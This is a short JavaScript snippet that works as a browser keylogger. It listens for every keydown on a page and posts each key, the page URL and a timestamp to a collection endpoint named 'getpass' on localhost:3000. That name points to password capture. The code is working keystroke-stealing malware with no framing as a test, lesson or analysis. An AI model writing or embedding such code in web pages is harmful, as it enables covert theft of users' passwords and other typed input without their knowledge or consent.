document.addEventListener('keydown', (event) => {
    const keyData = {
      key: event.key,
      page: window.location.href,
      timestamp: new Date().toISOString()
    };
  
    // Send keystroke data to the local server
    fetch('http://localhost:3000/getpass', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(keyData)
    });
  });
  